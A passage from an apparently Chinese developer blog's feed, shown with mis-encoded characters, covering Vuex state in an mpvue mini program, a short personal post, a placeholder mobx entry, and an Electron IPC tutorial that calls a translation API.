javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> mutations <span class="keyword">from</span> <span class="string">&#x27;./mutations&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">    videoPlayId: -<span class="number">1</span>,</span><br><span class="line">    userInfo: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    state,</span><br><span class="line">    mutations</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>ç»‘å®šStore åˆ°mpvue</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¼å…¥Store</span></span><br><span class="line"><span class="keyword">import</span> Store <span class="keyword">from</span> <span class="string">&#x27;./stores&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br><span class="line">App.mpType = <span class="string">&#x27;app&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç»‘å®š</span></span><br><span class="line">Vue.prototype.$store = Store</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(App)</span><br><span class="line">app.$mount()</span><br></pre></td></tr></table></figure><p>åœ¨ä½¿ç”¨çš„åœ°æ–¹ï¼Œéœ€è¦å§stateå®šä¹‰çš„å˜é‡ï¼ŒåŠè§¦å‘çš„æ–¹æ³•å¯¼å‡ºã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button :<span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;&#123;logged: isLogged&#125;&quot;</span> </span><br><span class="line">open-type=<span class="string">&quot;getUserInfo&quot;</span> :lang=<span class="string">&quot;zh_CN&quot;</span> </span><br><span class="line">@click=<span class="string">&quot;doLogin&quot;</span></span><br><span class="line">&gt;è·å–ç”¨æˆ·ä¿¡æ¯&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---å¼€å§‹ vuex </span></span><br><span class="line"><span class="keyword">import</span> &#123; mapState, mapMutations &#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; UserInfor &#125; <span class="keyword">from</span> <span class="string">&#x27;@/stores/mutation-types&#x27;</span></span><br><span class="line"><span class="comment">// ---ç»“æŸ vuex</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; get, showSuccess, showModal &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/index&#x27;</span></span><br><span class="line"><span class="keyword">import</span> qcloud <span class="keyword">from</span> <span class="string">&#x27;wafer2-client-sdk&#x27;</span></span><br><span class="line"><span class="keyword">import</span> config <span class="keyword">from</span> <span class="string">&#x27;./../../config&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  computed:&#123;</span><br><span class="line">    <span class="comment">// --- å¯¼å‡º state å®šä¹‰çš„ userInfo å˜é‡</span></span><br><span class="line">    ...mapState([</span><br><span class="line">      <span class="string">&#x27;userInfo&#x27;</span></span><br><span class="line">    ]),</span><br><span class="line">    isLogged () &#123;</span><br><span class="line">      <span class="keyword">return</span> !!<span class="built_in">this</span>.userInfo[<span class="string">&#x27;openId&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    <span class="comment">/* --- å¯¼å‡º Mutations å®šä¹‰çš„ UserInforå˜é‡ç”¨æ¥ï¼Œ</span></span><br><span class="line"><span class="comment">   ä¿®æ”¹Store.stateçš„userInfoå€¼ */</span></span><br><span class="line">    ...mapMutations([</span><br><span class="line">      UserInfor</span><br><span class="line">    ]),</span><br><span class="line">    <span class="function"><span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      qcloud.login(&#123;</span><br><span class="line">        success: <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// è°ƒç”¨Store æ–¹æ³•å»ä¿®æ”¹</span></span><br><span class="line">          <span class="built_in">this</span>[UserInfor](res)</span><br><span class="line">          <span class="comment">// this.userInfo // å¯ä»¥ ç›´æ¥è®¿é—®</span></span><br><span class="line">        &#125;,</span><br><span class="line">        fail: <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">this</span>[UserInfor](&#123;&#125;)</span><br><span class="line">          showModal(<span class="string">&#x27;ç™»å½•é”™è¯¯&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.logged&#123;</span><br><span class="line">  display: none;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ä½œå“å±•ç¤º"><a href="#ä½œå“å±•ç¤º" class="headerlink" title="ä½œå“å±•ç¤º"></a>ä½œå“å±•ç¤º</h3><img src="/posts/88e91fb0/1.png" class="" width="260" title="ç‚¹èµé¡µé¢"><img src="/posts/88e91fb0/2.png" class="" width="260" title="æ’­æ”¾é¡µ"><img src="/posts/88e91fb0/3.png" class="" width="260" title="å·²ç‚¹èµé¡µé¢"><img src="/posts/88e91fb0/4.png" class="" width="260" title="é¦–é¡µ"><img src="/posts/88e91fb0/5.png" class="" width="260" title="åˆ†äº«é¡µé¢">]]></content>
      
      
      
        <tags>
            
            <tag> å¾®ä¿¡å°ç¨‹åº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ƒå¤•ä¹‹æ—¥</title>
      <link href="posts/a4e34216/"/>
      <url>posts/a4e34216/</url>
      
        <content type="html"><![CDATA[<h1 id="æˆ‘çˆ±ä½ å°±åƒè€é¼ çˆ±å¤§ç±³"><a href="#æˆ‘çˆ±ä½ å°±åƒè€é¼ çˆ±å¤§ç±³" class="headerlink" title="æˆ‘çˆ±ä½ å°±åƒè€é¼ çˆ±å¤§ç±³"></a>æˆ‘çˆ±ä½ å°±åƒè€é¼ çˆ±å¤§ç±³</h1>]]></content>
      
      
      
        <tags>
            
            <tag> ç§å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸºäºmobxçš„è¡¨å•éªŒè¯(mobx-react-form)</title>
      <link href="posts/f8f5c654/"/>
      <url>posts/f8f5c654/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸‹è½½åœ°å€"><a href="#ä¸‹è½½åœ°å€" class="headerlink" title="ä¸‹è½½åœ°å€"></a>ä¸‹è½½åœ°å€</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sssssss</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> mobx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Electron åº”ç”¨ ï¼ˆçˆ±ç¿»è¯‘ï¼‰</title>
      <link href="posts/e39f5ecb/"/>
      <url>posts/e39f5ecb/</url>
      
        <content type="html"><![CDATA[<h3 id="ä»€ä¹ˆæ˜¯-Electron"><a href="#ä»€ä¹ˆæ˜¯-Electron" class="headerlink" title="ä»€ä¹ˆæ˜¯ Electron"></a>ä»€ä¹ˆæ˜¯ Electron</h3><p><a href="https://link.juejin.im/?target=https://electron.atom.io">Electron</a> æ˜¯å‰ç«¯å¼€å‘è€…å»æ„å»ºè·¨å¹³å°æ¡Œé¢åº”ç”¨çš„ä¸€ç§æ–¹æ¡ˆã€‚å¤§å®¶ç†Ÿæ‚‰çš„ Atom å’Œ VSCode ç¼–è¾‘å™¨å°±æ˜¯ä½¿ç”¨ Electron å¼€å‘çš„ã€‚</p><p><a href="https://link.juejin.im/?target=https://electron.atom.io">Electron</a> æ˜¯ Node.js å’Œ Chromium æµè§ˆå™¨çš„ç»“åˆä½“ï¼Œç”¨ Chromium æµè§ˆå™¨æ˜¾ç¤ºå‡ºçš„ Web é¡µé¢ä½œä¸ºåº”ç”¨çš„ GUIï¼Œé€šè¿‡ Node.js å»å’Œæ“ä½œç³»ç»Ÿäº¤äº’ã€‚ å½“ä½ åœ¨ Electron åº”ç”¨ä¸­çš„ä¸€ä¸ªçª—å£æ“ä½œæ—¶ï¼Œå®é™…ä¸Šæ˜¯åœ¨æ“ä½œä¸€ä¸ªç½‘é¡µã€‚å½“ä½ çš„æ“ä½œéœ€è¦é€šè¿‡æ“ä½œç³»ç»Ÿå»å®Œæˆæ—¶ï¼Œç½‘é¡µä¼šé€šè¿‡ Node.js å»å’Œæ“ä½œç³»ç»Ÿäº¤äº’ã€‚</p><a id="more"></a><p><a href="https://link.juejin.im/?target=https://electron.atom.io">Electron</a> å¼€å‘æ¡Œé¢ç«¯åº”ç”¨çš„ä¼˜ç‚¹æœ‰ï¼š</p><ul><li>é™ä½å¼€å‘é—¨æ§›ï¼Œå‡å°‘äº†å­¦ä¹ çš„æˆæœ¬ï¼Œåªéœ€æŒæ¡å‰ç«¯æŠ€æœ¯å’Œ Node.js å³å¯ï¼Œä¸éœ€è¦ä¸ºå¼€å‘ä¸€ä¸ªæ¡Œé¢åº”ç”¨å»å­¦ä¹ å…¶å®ƒçš„ç¼–ç¨‹è¯­è¨€ã€‚</li><li>ç”±äº Chromium æµè§ˆå™¨å’Œ Node.js éƒ½æ˜¯è·¨å¹³å°çš„ï¼ŒElectron èƒ½åšåˆ°å†™ä¸€ä»½ä»£ç åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿè¿è¡Œã€‚</li><li>è€Œä¸”å¯ä»¥ä½¿ç”¨ vue\react ç­‰æ¡†æ¶å»å¼€å‘ GUIï¼Œæ€»ä¹‹å¼ºå¤§çš„ç”Ÿæ€ç³»ç»Ÿè¿˜éœ€è¦çµæ´»çš„ç»Ÿç­¹èƒ½åŠ›ï¼Œå»ç»„åˆã€‚</li></ul><h3 id="Electron-çš„è¿›ç¨‹é—®é¢˜ï¼Ÿ"><a href="#Electron-çš„è¿›ç¨‹é—®é¢˜ï¼Ÿ" class="headerlink" title="Electron çš„è¿›ç¨‹é—®é¢˜ï¼Ÿ"></a>Electron çš„è¿›ç¨‹é—®é¢˜ï¼Ÿ</h3><h4 id="1ã€-ä¸»è¿›ç¨‹-Main-Process"><a href="#1ã€-ä¸»è¿›ç¨‹-Main-Process" class="headerlink" title="1ã€ ä¸»è¿›ç¨‹ Main Process"></a>1ã€ ä¸»è¿›ç¨‹ Main Process</h4><p>ä¸»è¿›ç¨‹ï¼Œå…¶å®å°±æ˜¯ electron æ‰§è¡Œæ—¶ï¼Œé¦–æ¬¡åŠ è½½çš„å¯æ‰§è¡Œä»£ç èµ„æºã€‚æˆ‘è¦æ¸²æŸ“æ¯ä¸ª GUI é¡µé¢ï¼Œå°±éœ€è¦æœ‰ä¸»è¿›ç¨‹å»æŠŠæ§èµ„æºçš„åˆ†é…ã€é‡Šæ”¾ã€‚é‚£ä¹ˆåœ¨ Electron ä¸­æ€ä¹ˆç¡®è®¤æˆ‘å†™çš„é‚£ä¸ªæ–‡ä»¶æ˜¯ä¸»è¿›ç¨‹æ–‡ä»¶å‘¢ã€‚<br>ä¸»è¿›ç¨‹åŠ è½½çš„æ–‡ä»¶å°±æ˜¯ï¼špackages.json æ–‡ä»¶ä¸­çš„ main å­—æ®µæŒ‡å‘çš„æ–‡ä»¶ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">è¿™æ˜¯ä¸€ä»½æœ€åŸºç¡€çš„ä¸»è¿›ç¨‹ä»£ç ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; app, BrowserWindow &#125; = <span class="built_in">require</span>(<span class="string">&quot;electron&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> win;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createWindow</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  win = <span class="keyword">new</span> BrowserWindow(&#123; <span class="attr">width</span>: <span class="number">800</span>, <span class="attr">height</span>: <span class="number">600</span> &#125;);</span><br><span class="line">  <span class="keyword">const</span> indexPageURL = <span class="string">`file://<span class="subst">$&#123;__dirname&#125;</span>/dist/index.html`</span>;</span><br><span class="line">  win.loadURL(indexPageURL);</span><br><span class="line">  win.on(<span class="string">&quot;closed&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    win = <span class="literal">null</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">app.on(<span class="string">&quot;ready&quot;</span>, createWindow);</span><br><span class="line">app.on(<span class="string">&quot;window-all-closed&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (process.platform !== <span class="string">&quot;darwin&quot;</span>) &#123;</span><br><span class="line">    app.quit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="2ã€æ¸²æŸ“è¿›ç¨‹-Render-Process"><a href="#2ã€æ¸²æŸ“è¿›ç¨‹-Render-Process" class="headerlink" title="2ã€æ¸²æŸ“è¿›ç¨‹ Render Process"></a>2ã€æ¸²æŸ“è¿›ç¨‹ Render Process</h4><p>æ¸²æŸ“è¿›ç¨‹ï¼Œå°±æ˜¯ç”¨æ¥è¿›è¡Œè¿›è¡Œé¡µé¢çš„æ¸²æŸ“ï¼Œåœ¨ä¸»è¿›åŸåˆ›å»ºå¥½å‹ï¼Œä¼šè°ƒç”¨æ¸²æŸ“è¿›ç¨‹å»æ¸²æŸ“é¡µé¢èµ„æºã€‚æ¸²æŸ“è¿›ç¨‹æŒ‡å‘çš„èµ„æºä¹Ÿå°±æ˜¯ä½ æ„å»ºå¥½ã€è¦å‘ˆç°è§†å›¾çš„ HTML å‰ç«¯ä»£ç èµ„æºæ–‡ä»¶ã€‚æ¯”å¦‚ä½ ä½¿ç”¨ webpack æ„å»ºå‡ºæ¥çš„ dist æ–‡ä»¶å¤¹é‡Œé¢çš„æ•°æ®å°±æ˜¯ã€‚<br>æ¸²æŸ“è¿›ç¨‹ä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯æµè§ˆå™¨çš„æ¯ä¸€ä¸ªé¡µé¢ï¼Œä¸€ä¸ªé¡µé¢å¯¹åº”ä¸€ä¸ªè¿›ç¨‹ï¼Œæ˜¯ä¸ç›¸åŒçš„ã€‚æ¸²æŸ“è¿›ç¨‹çš„åˆ›å»ºéœ€è¦ç”±ä¸»è¿›ç¨‹ BrowserWindow å¯¹è±¡å»åˆ›å»ºã€‚</p><h4 id="3ã€ä¸»è¿›ç¨‹ä¸æ¸²æŸ“è¿›ç¨‹çš„å…³ç³»"><a href="#3ã€ä¸»è¿›ç¨‹ä¸æ¸²æŸ“è¿›ç¨‹çš„å…³ç³»" class="headerlink" title="3ã€ä¸»è¿›ç¨‹ä¸æ¸²æŸ“è¿›ç¨‹çš„å…³ç³»"></a>3ã€ä¸»è¿›ç¨‹ä¸æ¸²æŸ“è¿›ç¨‹çš„å…³ç³»</h4><ul><li>ä¸»è¿›ç¨‹åœ¨åˆ›å»ºå¥½åï¼Œä¼šåœ¨åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹å»åŠ è½½èµ„æºï¼Œèµ„æºå¯ä»¥æ˜¯ç½‘è·¯èµ„æº(ç½‘ç«™åœ°å€)ï¼Œä¹Ÿå¯ä»¥æ˜¯æœ¬åœ°èµ„æº(html æ–‡ä»¶)ã€‚</li><li>ä¸»è¿›ç¨‹åœ¨åˆ›å»ºçª—å£å¯¹è±¡åï¼Œæ‰ä¼šé€šè¿‡å­è¿›ç¨‹å»åŠ è½½èµ„æºï¼Œé‚£ä¹ˆçª—å£åˆ›å»ºæ˜¯æœ‰ç›¸åº”çš„ç”Ÿå‘½å‘¨æœŸäº‹ä»¶å»è§¦å‘çš„ã€‚è¯¦æƒ…è§# <a href="https://electronjs.org/docs/api/browser-window#browserwindow">BrowserWindow</a></li></ul><h4 id="4ã€è¿›ç¨‹é€šä¿¡-ä¸»è¿›ç¨‹-æ¸²æŸ“è¿›ç¨‹"><a href="#4ã€è¿›ç¨‹é€šä¿¡-ä¸»è¿›ç¨‹-æ¸²æŸ“è¿›ç¨‹" class="headerlink" title="4ã€è¿›ç¨‹é€šä¿¡ [ä¸»è¿›ç¨‹-æ¸²æŸ“è¿›ç¨‹]"></a>4ã€è¿›ç¨‹é€šä¿¡ [ä¸»è¿›ç¨‹-æ¸²æŸ“è¿›ç¨‹]</h4><p>æˆ‘ä»¬åœ¨å¼€å‘ç½‘é¡µåº”ç”¨çš„æ—¶å€™ï¼Œéœ€è¦å®ç°è·¨é¡µé¢é€šä¿¡ã€‚å¯ä»¥ä½¿ç”¨<strong>localStorage</strong> å’Œ <strong>H5 postMessages</strong>ã€‚é‚£ä¹ˆåˆ°äº† electron ä¸­åŒæ ·é€‚ç”¨ï¼Œä½†æ˜¯è¿˜æœ‰å…¶å®ƒçš„æ–¹æ³•å»å®ç°é€šä¿¡ã€‚å°±æ˜¯è¿›ç¨‹é€šä¿¡ï¼</p><ul><li>ä¸€ç§æ˜¯ä½¿ç”¨<a href="https://github.com/electron/electron/blob/v1.1.3/docs/api/ipc-main.md">ipcMain</a>å’Œ<a href="https://github.com/electron/electron/blob/v1.1.3/docs/api/ipc-renderer.md">ipcRenderer</a>æ¨¡å—ï¼Œåœ¨æ¸²æŸ“è¿›ç¨‹ä¸­ä½¿ç”¨ ipcRender æ¨¡å—å‘ä¸»è¿›ç¨‹å‘é€æ¶ˆæ¯ï¼Œä¸»è¿›ç¨‹ä¸­ ipcMain æ¥æ”¶æ¶ˆæ¯ï¼Œè¿›è¡Œæ“ä½œï¼Œå¦‚æœè¿˜éœ€è¦åé¦ˆï¼Œåˆ™é€šçŸ¥æ¸²æŸ“è¿›ç¨‹ï¼Œæ¸²æŸ“è¿›ç¨‹æ ¹æ®æ¥æ”¶çš„å†…å®¹æ‰§è¡Œç›¸åº”çš„æ“ä½œï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">ä¸»è¿›ç¨‹;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; app, BrowserWindow, ipcMain &#125; = <span class="built_in">require</span>(<span class="string">&quot;electron&quot;</span>);</span><br><span class="line"></span><br><span class="line">ipcMain.on(<span class="string">&quot;fy&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; net &#125; = <span class="built_in">require</span>(<span class="string">&quot;electron&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> request = net.request(</span><br><span class="line">    <span class="string">&quot;http://translate.google.cn/translate_a/single?client=gtx&amp;dt=t&amp;ie=UTF-8&amp;oe=UTF-8&amp;sl=auto&amp;tl=en&amp;q=&quot;</span> +</span><br><span class="line">      value</span><br><span class="line">  );</span><br><span class="line">  request.on(<span class="string">&quot;response&quot;</span>, <span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    response.setEncoding(<span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> connect = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    response.on(<span class="string">&quot;data&quot;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">      connect = chunk;</span><br><span class="line">    &#125;);</span><br><span class="line">    response.on(<span class="string">&quot;end&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      mainWindow.webContents.send(<span class="string">&quot;fymessage&quot;</span>, connect);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  request.end();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">æ¸²æŸ“è¿›ç¨‹;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; remote, dialog, ipcRenderer &#125; <span class="keyword">from</span> <span class="string">&quot;electron&quot;</span>;</span><br><span class="line"></span><br><span class="line">handleSearch = <span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  ipcRenderer.send(<span class="string">&quot;fy&quot;</span>, value);</span><br><span class="line">  <span class="keyword">const</span> that = <span class="built_in">this</span>;</span><br><span class="line">  ipcRenderer.on(<span class="string">&quot;fymessage&quot;</span>, <span class="function">(<span class="params">event, text</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(text);</span><br><span class="line">    that.setState(&#123;</span><br><span class="line">      languageText: text.split(<span class="string">&#x27;&quot;,&#x27;</span>)[<span class="number">0</span>].replace(<span class="regexp">/\[\[\[\&quot;/g</span>, <span class="string">&quot;&quot;</span>),</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>ç¬¬äºŒç§æ˜¯ç›´æ¥åœ¨æ¸²æŸ“è¿›ç¨‹ä½¿ç”¨<a href="http://electron.atom.io/docs/api/remote/">remote</a>æ¨¡å—ï¼Œremote æ¨¡å—å¯ä»¥ç›´æ¥è·å–ä¸»è¿›ç¨‹ä¸­çš„æ¨¡å—ã€‚è¿™ç§æ–¹å¼å…¶å®æ˜¯ç¬¬ä¸€ç§æ–¹å¼çš„ç®€åŒ–ã€‚</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡remoteå¯¹è±¡è°ƒç”¨ä¸»è¿›ç¨‹è¿›è¡Œdialogæ“ä½œã€‚</span><br><span class="line"></span><br><span class="line"> remote.dialog.showErrorBox(<span class="string">&quot;ç¿»è¯‘å¤±è´¥&quot;</span>, <span class="string">&quot;ç¿»è¯‘å†…å®¹ä¸èƒ½ä¸ºç©ºï¼Œè¯·é‡æ–°æ‰§è¡Œ&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>ç¬¬ä¸‰ç§æ˜¯ä¸»è¿›ç¨‹å‘æ¸²æŸ“è¿›ç¨‹å‘é€æ¶ˆæ¯</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mainWindowï¼šæ˜¯é€šè¿‡ <span class="keyword">new</span>  BrowserWindow(&#123;&#125;) åˆ›å»ºå‡ºæ¥çš„çª—å£å¯¹è±¡ã€‚</span><br><span class="line">mainWindow.webContents.send(<span class="string">&#x27;å‘é€æ ‡è¯†-ç±»å‹åˆ¤æ–­&#x27;</span>, <span class="string">&#x27;å‘é€å†…å®¹&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>ç¬¬å››ç§æ˜¯æ¸²æŸ“è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸»è¿›ç¨‹</span></span><br><span class="line"><span class="comment">// ä¸¤ä¸ªçª—å£äº’ç›¸è·å–å¯¹æ–¹çš„çª—å£ id, å¹¶å‘é€ç»™æ¸²æŸ“è¿›ç¨‹</span></span><br><span class="line">win1.webContents.send(<span class="string">&quot;distributeIds&quot;</span>, &#123;</span><br><span class="line">  win2Id: win2.id,</span><br><span class="line">&#125;);</span><br><span class="line">win2.webContents.send(<span class="string">&quot;distributeIds&quot;</span>, &#123;</span><br><span class="line">  win1Id: win1.id,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¸²æŸ“è¿›ç¨‹</span></span><br><span class="line"><span class="comment">// é€šè¿‡ id å¾—åˆ°çª—å£</span></span><br><span class="line">remote.BrowserWindow.fromId(win2Id).webContents.send(<span class="string">&quot;someMsg&quot;</span>, <span class="string">&quot;someThing&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ€»ä½“æ¥è¯´ï¼Œelectron å¼€å‘ä¸æ˜¯å¾ˆéš¾ï¼Œè€Œæ˜¯å¯¹æµè§ˆå™¨çš„é‡æ–°è®¤è¯†ã€‚<br>åœ¨ä¸Šè¿°çš„åˆ—å­ä¸­ï¼Œè®²è§£äº†å¦‚ä½•è¿›ç¨‹é€šä¿¡ï¼Œä¹Ÿè¡¨è¿°äº† electron çš„ net æ¨¡å—ï¼Œè¿›è¡Œ http é€šä¿¡ã€‚åœ¨è¿™é‡Œæˆ‘ä½¿ç”¨äº†è°·æ­Œçš„ç¿»è¯‘æ¥å£ï¼Œè¿™ä¸ªæ¥å£ä¹Ÿæ˜¯é€†å‘åˆ†æå‡ºæ¥çš„ã€‚æ€ä¹ˆåˆ†æå°±ä¸å™è¿°äº†ã€‚è¿™é‡Œåªæ¦‚è¿° electron 